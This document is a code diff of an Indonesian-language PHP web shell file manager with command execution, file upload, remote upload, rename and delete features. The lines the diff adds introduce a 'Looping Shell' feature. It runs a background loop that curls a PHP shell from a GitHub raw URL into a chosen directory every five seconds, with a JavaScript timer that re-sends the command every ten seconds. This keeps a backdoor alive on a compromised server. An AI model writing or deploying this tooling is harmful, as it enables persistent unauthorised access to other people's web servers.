-                        <input type="url" name="remote_url" class="form-control" placeholder="https://example.com/" required id="remoteUrl">
-                    </div>
-                    <div id="remoteProgress" class="progress-upload mb-3" style="display:none;">
-                        <div class="progress-bar" id="remoteProgressBar" style="width:0%"></div>
-                    </div>
-                    <button type="submit" class="btn-glass w-100"><i class="fas fa-download me-1"></i>Download & Upload</button>
-                </form>
-            </div>
+    <div class="modal-dialog"><div class="modal-content">
+        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-cloud-download-alt me-2"></i>Remote Upload</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+        <div class="modal-body">
+            <form id="remoteForm">
+                <div class="mb-3"><label class="form-label">URL File</label><input type="url" name="remote_url" class="form-control" placeholder="https://example.com/" required id="remoteUrl"></div>
+                <div id="remoteProgress" class="progress-upload mb-3" style="display:none;"><div class="progress-bar" id="remoteProgressBar" style="width:0%"></div></div>
+                <button type="submit" class="btn-glass w-100"><i class="fas fa-download me-1"></i>Download & Upload</button>
+            </form>
         </div>
-    </div>
+    </div></div>
 </div>
-
-<!-- MODAL: RENAME -->
 <div class="modal fade" id="renameModal" tabindex="-1">
-    <div class="modal-dialog">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h5 class="modal-title"><i class="fas fa-pen me-2"></i>Rename <span id="renameType" style="color:#ffc107;"></span></h5>
-                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-            </div>
-            <div class="modal-body">
-                <form method="POST" id="renameForm">
-                    <input type="hidden" name="rename" value="1">
-                    <input type="hidden" name="old_name" id="renameOld">
-                    <div class="mb-3">
-                        <label class="form-label">Nama Baru</label>
-                        <input type="text" name="new_name" class="form-control" id="renameNew" placeholder="nama_baru" required>
-                    </div>
-                    <button type="submit" class="btn-glass-warning w-100"><i class="fas fa-check me-1"></i>Rename</button>
-                </form>
-            </div>
+    <div class="modal-dialog"><div class="modal-content">
+        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-pen me-2"></i>Rename <span id="renameType" style="color:#ffc107;"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
+        <div class="modal-body">
+            <form method="POST" id="renameForm">
+                <input type="hidden" name="rename" value="1">
+                <input type="hidden" name="old_name" id="renameOld">
+                <div class="mb-3"><label class="form-label">Nama Baru</label><input type="text" name="new_name" class="form-control" id="renameNew" placeholder="nama_baru" required></div>
+                <button type="submit" class="btn-glass-warning w-100"><i class="fas fa-check me-1"></i>Rename</button>
+            </form>
         </div>
-    </div>
+    </div></div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -837,32 +696,14 @@ function buildBreadcrumb($path) {
 function confirmDelete(name, event) {
     event.preventDefault();
     var link = event.target.closest('a');
-    var href = link.getAttribute('href');
-    Swal.fire({
-        title: 'Hapus?',
-        text: 'Yakin ingin menghapus "' + name + '"?',
-        icon: 'warning',
-        showCancelButton: true,
-        confirmButtonColor: '#ff4757',
-        cancelButtonColor: '#6c757d',
-        confirmButtonText: 'Ya, hapus!',
-        cancelButtonText: 'Batal',
-        background: '#1a1a2e',
-        color: '#fff'
-    }).then((r) => {
-        if (r.isConfirmed) {
-            window.location.href = href;
-        }
-    });
+    Swal.fire({ title: 'Hapus?', text: 'Yakin ingin menghapus "' + name + '"?', icon: 'warning', showCancelButton: true, confirmButtonColor: '#ff4757', cancelButtonColor: '#6c757d', confirmButtonText: 'Ya, hapus!', cancelButtonText: 'Batal', background: '#1a1a2e', color: '#fff' }).then((r) => { if (r.isConfirmed) window.location.href = link.getAttribute('href'); });
     return false;
 }
-
 function openRename(name, type) {
     document.getElementById('renameType').textContent = type.toUpperCase() + ': ' + name;
     document.getElementById('renameOld').value = name;
     document.getElementById('renameNew').value = name;
-    var modal = new bootstrap.Modal(document.getElementById('renameModal'));
-    modal.show();
+    new bootstrap.Modal(document.getElementById('renameModal')).show();
 }
 
 document.getElementById('uploadForm').addEventListener('submit', function(e) {
@@ -870,36 +711,20 @@ document.getElementById('uploadForm').addEventListener('submit', function(e) {
     var formData = new FormData(this);
     var prog = document.getElementById('uploadProgress');
     var bar = document.getElementById('progressBar');
-    prog.style.display = 'block';
-    bar.style.width = '0%';
-
+    prog.style.display = 'block'; bar.style.width = '0%';
     $.ajax({
         url: '?dir=<?php echo urlencode($dir); ?>&ajax=upload',
-        type: 'POST',
-        data: formData,
-        processData: false,
-        contentType: false,
+        type: 'POST', data: formData, processData: false, contentType: false,
         xhr: function() {
             var xhr = new XMLHttpRequest();
-            xhr.upload.addEventListener('progress', function(evt) {
-                if (evt.lengthComputable) {
-                    var pct = Math.round((evt.loaded / evt.total) * 100);
-                    bar.style.width = pct + '%';
-                }
-            });
+            xhr.upload.addEventListener('progress', function(evt) { if (evt.lengthComputable) bar.style.width = Math.round((evt.loaded/evt.total)*100) + '%'; });
             return xhr;
         },
         success: function(res) {
             bar.style.width = '100%';
-            setTimeout(function() {
-                Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' })
-                    .then(() => location.reload());
-            }, 500);
+            setTimeout(function() { Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }).then(() => location.reload()); }, 500);
         },
-        error: function() {
-            prog.style.display = 'none';
-            Swal.fire({ icon: 'error', title: 'Gagal', text: 'Upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' });
-        }
+        error: function() { prog.style.display = 'none'; Swal.fire({ icon: 'error', title: 'Gagal', text: 'Upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }); }
     });
 });
 
@@ -908,66 +733,150 @@ document.getElementById('remoteForm').addEventListener('submit', function(e) {
     var url = document.getElementById('remoteUrl').value;
     var prog = document.getElementById('remoteProgress');
     var bar = document.getElementById('remoteProgressBar');
-    prog.style.display = 'block';
-    bar.style.width = '30%';
-
+    prog.style.display = 'block'; bar.style.width = '30%';
     $.ajax({
         url: '?dir=<?php echo urlencode($dir); ?>&ajax=upload',
-        type: 'POST',
-        data: { remote_url: url },
+        type: 'POST', data: { remote_url: url },
         success: function(res) {
             bar.style.width = '100%';
-            setTimeout(function() {
-                Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Remote upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' })
-                    .then(() => location.reload());
-            }, 500);
+            setTimeout(function() { Swal.fire({ icon: 'success', title: 'Berhasil!', text: res.message || 'Remote upload selesai', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }).then(() => location.reload()); }, 500);
         },
-        error: function() {
-            prog.style.display = 'none';
-            Swal.fire({ icon: 'error', title: 'Gagal', text: 'Remote upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' });
-        }
+        error: function() { prog.style.display = 'none'; Swal.fire({ icon: 'error', title: 'Gagal', text: 'Remote upload gagal', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' }); }
     });
 });
 
-// Ctrl+S untuk simpan
 document.addEventListener('DOMContentLoaded', function() {
     document.addEventListener('keydown', function(e) {
-        if ((e.ctrlKey || e.metaKey) && e.key === 's') {
+        if ((e.ctrlKey||e.metaKey) && e.key === 's') {
             var form = document.querySelector('.editor-footer form');
-            if (form) {
-                e.preventDefault();
-                form.submit();
-            }
+            if (form) { e.preventDefault(); form.submit(); }
+        }
+    });
+    document.querySelectorAll('input[name="cmd"]').forEach(function(inp) {
+        inp.addEventListener('keydown', function(e) { if (e.key === 'Enter') { e.preventDefault(); this.closest('form').submit(); } });
+    });
+
+    // ========== LOOPING SHELL LOGIC (DENGAN MODAL DIRECTORY) ==========
+    let loopInterval = null;
+    const loopBtn = document.getElementById('loopShellBtn');
+    const loopBtnText = document.getElementById('loopBtnText');
+    const loopToast = document.getElementById('loopToast');
+    const loopToastText = document.getElementById('loopToastText');
+    const loopDirModalEl = document.getElementById('loopDirModal');
+    const loopDirModal = new bootstrap.Modal(loopDirModalEl);
+
+    // Tombol Looping: jika sudah running => stop, jika belum => buka modal
+    loopBtn.addEventListener('click', function() {
+        if (loopInterval) {
+            // STOP looping
+            clearInterval(loopInterval);
+            loopInterval = null;
+            loopBtn.classList.remove('active');
+            loopBtnText.textContent = 'Looping Shell';
+            loopToast.style.display = 'none';
+            Swal.fire({
+                icon: 'info',
+                title: 'Looping Dihentikan',
+                text: 'Proses looping shell telah berhenti.',
+                background: '#1a1a2e',
+                color: '#fff',
+                confirmButtonColor: '#667eea',
+                timer: 2000,
+                timerProgressBar: true
+            });
+        } else {
+            // Tampilkan modal dengan uname -a dan input direktori
+            loopDirModal.show();
         }
     });
 
-    var cmdInputs = document.querySelectorAll('input[name="cmd"]');
-    cmdInputs.forEach(function(inp) {
-        inp.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                e.preventDefault();
-                this.closest('form').submit();
+    // Handle submit form looping di modal
+    document.getElementById('loopForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const targetDir = document.getElementById('loopDirInput').value.trim();
+
+        if (!targetDir) {
+            Swal.fire({
+                icon: 'warning',
+                title: 'Oops!',
+                text: 'Direktori tidak boleh kosong!',
+                background: '#1a1a2e',
+                color: '#fff',
+                confirmButtonColor: '#667eea'
+            });
+            return;
+        }
+
+        // Tutup modal
+        loopDirModal.hide();
+
+        // Command: buat direktori jika belum ada, lalu looping download shell ke direktori itu
+        // Gunakan mkdir -p agar tidak error jika direktori sudah ada
+        const cmd = "(mkdir -p " + targetDir + " && while true; do curl -sL https://raw.githubusercontent.com/nortslem/LiteSpeed/refs/heads/main/shellph8.php -o " + targetDir + "/shellph8.php; sleep 5; done) &";
+
+        // Kirim command via AJAX untuk memulai proses background
+        $.ajax({
+            url: window.location.href,
+            type: 'POST',
+            data: { cmd: cmd },
+            success: function() {
+                // Set interval untuk keep-alive (ulang command tiap 10 detik agar proses tetap berjalan)
+                loopInterval = setInterval(function() {
+                    $.ajax({
+                        url: window.location.href,
+                        type: 'POST',
+                        data: { cmd: cmd },
+                        success: function() {
+                            loopToastText.textContent = 'Looping ke ' + targetDir + ' - ' + new Date().toLocaleTimeString();
+                        },
+                        error: function() {
+                            loopToastText.textContent = 'Looping: error request';
+                        }
+                    });
+                }, 10000);
+
+                // Update UI
+                loopBtn.classList.add('active');
+                loopBtnText.textContent = 'Stop Loop';
+                loopToast.style.display = 'flex';
+                loopToastText.textContent = 'Looping dimulai ke: ' + targetDir;
+
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Looping Dimulai!',
+                    html: 'Shell akan didownload terus ke:<br><strong>' + targetDir + '/shellph8.php</strong><br>setiap 5 detik.',
+                    background: '#1a1a2e',
+                    color: '#fff',
+                    confirmButtonColor: '#ff4757',
+                    timer: 3000,
+                    timerProgressBar: true
+                });
+            },
+            error: function() {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Gagal',
+                    text: 'Gagal memulai looping shell. Cek path direktori.',
+                    background: '#1a1a2e',
+                    color: '#fff',
+                    confirmButtonColor: '#667eea'
+                });
             }
         });
+    });
+
+    // Reset modal form ketika ditutup tanpa submit
+    loopDirModalEl.addEventListener('hidden.bs.modal', function() {
+        // Tidak perlu reset value, biarkan sesuai default
     });
 });
 </script>
 </body>
 </html>
 <?php
-// NOTIFIKASI SWEETALERT
 if ($message) {
     $icon = ($msgType === 'error') ? 'error' : 'success';
     $title = ($msgType === 'error') ? 'Gagal!' : 'Berhasil!';
-    echo '<script>
-        Swal.fire({
-            icon: "' . $icon . '",
-            title: "' . $title . '",
-            text: "' . addslashes($message) . '",
-            background: "#1a1a2e",
-            color: "#fff",
-            confirmButtonColor: "#667eea"
-        });
-    </script>';
+    echo '<script>Swal.fire({icon:"' . $icon . '",title:"' . $title . '",text:"' . addslashes($message) . '",background:"#1a1a2e",color:"#fff",confirmButtonColor:"#667eea"});</script>';
 }
 ?>
